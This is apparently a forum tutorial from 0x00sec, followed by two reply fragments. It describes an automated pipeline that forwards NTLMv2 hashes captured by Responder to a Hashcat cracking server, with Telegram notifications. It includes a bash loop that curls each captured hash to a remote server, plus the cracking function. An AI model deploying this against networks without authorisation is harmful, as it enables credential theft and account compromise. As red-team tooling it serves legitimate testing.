    <title>Autocrack - A Responder to Hashcat Queue with Notifications</title>
    <link>https://0x00sec.org/t/autocrack-a-responder-to-hashcat-queue-with-notifications/21843</link>
    <description>Hello, 0x00ers!

In today&#39;s article I&#39;m going to be showing you how to set up something that allows you to automagically send hashes directly from Responder as soon as they&#39;re captured.

Once a new NTLMv2 hash has been caught by Responder, the `notify.sh` script will poll the sqlite database that Responder stores its hashes in every 10 seconds. If it discovers a change, it will identify the new hash.

# Responder Client
```
while true
do
	hashes=$(./UpHash.py | tr &#39; &#39; &#39;\n&#39;)
	new_hash=&quot;$(echo $hashes | sha256sum)&quot;

	if [[ &quot;$new_hash&quot; != &quot;$last_hash&quot;  ]]
	then
		for hash in $hashes
		do 
			if [[ ! $old_hashes =~ &quot;$hash&quot;  ]]
			then
				echo &quot;we got a new hash! $new_hash&quot;
				echo &quot;HASH: $hash&quot;
				short=$(echo $hash | cut -d &quot;:&quot; -f 1-4)
				curl -X POST -H &#39;Content-Type: application/json&#39; -d &quot;{\&quot;chat_id\&quot;: \&quot;$chat_id\&quot;, \&quot;text\&quot;: \&quot;Hash caught: $short :)\&quot;}&quot; https://api.telegram.org/bot$telegram_key/sendMessage
                curl -X POST --data &quot;key=$hashcat_key&amp;hash=$hash&quot; $url/submit &amp;
			fi
		done
	fi

	sleep 10
	last_hash=&quot;$new_hash&quot;
	old_hashes=&quot;$hashes&quot;
done
```

For this part to work, you need a Telegram bot and keys, I have written up how you can obtain this here:

https://github.com/pry0cc/ResponderNotify

# Hashcat Server
Now, to the server. So it is absolutely possible that you can use something like Hastroplis, I&#39;ve not looked into it very hard but I didn&#39;t have an entire machine to wipe and use JUST for hacking.

So instead I just wrote a quick bash wrapper for Hashcat, it reads a new hash from a Linux named pipe I named `/tmp/hashpipe`. It will read each line that goes into the FIFO pipe, truncate the hash into a readable format, then store the original hash in a file, and then begin to crack it. The hashcat server script also has Telegram notifications, so if it cracks successfully, then you get a message, if it fails, it will let you know!

I&#39;m really sorry about screenshots, but I&#39;m on a sensitive engagement and so I can&#39;t really share hash names (even if redacted) because it would be obvious.

This is the server:
https://github.com/pry0cc/autocrack

When you start it with `./autocrack`, it will start a HTTP server on port `8182`. To very quickly enable this to be accessible over the internet, you can run `ngrok http 8182`, and it will automatically get you a public address with a valid certificate.

The webserver is ruby with sinatra, so you&#39;ll need Ruby installed and you&#39;ll need to run `bundle install` inside the autocrack directory.

You&#39;ll also notice a master key is generated for the server, you&#39;ll need to put this key into your `notify.sh` script from the ResponderNotify repo.

Once you have this all setup, it really makes those longer-term engagements a lot nicer and means that you don&#39;t have to be glued to your responder window 24/7, you can just sit back and let it work its magic.

```
crack() {
    hash=&quot;$1&quot;
    name=&quot;$2&quot;
    mode=&quot;$3&quot;
    outfile=&quot;cracked/$name&quot;
    infile=&quot;hashes/$name&quot;
    time_started=$(date +%D-%T)
    job=&quot;{\&quot;job\&quot;:\&quot;$name\&quot;,\&quot;wordlist\&quot;:\&quot;$wordlist\&quot;,\&quot;rules\&quot;:\&quot;$rules\&quot;,\&quot;mode\&quot;:\&quot;$mode\&quot;, \&quot;time_started\&quot;:\&quot;$time_started\&quot;}&quot;
    echo $job | jq &gt; status.json
    echo $job &gt;&gt; jobs_log.json

    echo $line &gt;&gt; $infile
    
    # You should load up your full list here
    echo &quot;Starting hashcat...&quot;
    hashcat -a 0 -m $mode $infile -o $outfile $wordlist -r $rules 
}

```

Reading through autocrack too, you may notice a serious lack of hashcat commands. This is just a PoC, and should definitely be modified to make your workflow better. If you want to open a pull request and make it better, please do so!

We could maybe add some modularity too so people can share their hashcat methodologies. Hmm.

## Ingest Functions
I also wrote a few functions last night too, by sourcing the `functions.sh` file, you can run both:
```
source functions.sh
ingesthash &quot;&lt;NTLMV2HASH&gt;&quot;
ingesthashfile &lt;hashes.txt&gt;
```

Either &#39;ingesting&#39; a list of hashes, or a single hash inside quotes.

# Conclusion
In conclusion, setting up your own Responder -&gt; Hashcat pipeline is really easy, and if you have any trouble setting this up please message me on the 0x00sec Discord and I&#39;ll try my best to help you out :slight_smile:

Stay snapper 0x00ers!

            <p>The way we’ve written it (for now) hashes have to be submitted manually as CLI arguments, so it means going into the Responder session files (clunky, I know) and parsing them to be sent off to AWS.</p>

            <p>That’s my next thing to tackle!</p>
<p>Problem is though that you’d need to run the instance for a weekend because it has to wait and listen. SO I don’t know how you’d have it work. I’m in a situation where I’m getting hashes sporadically throughout the day.</p>
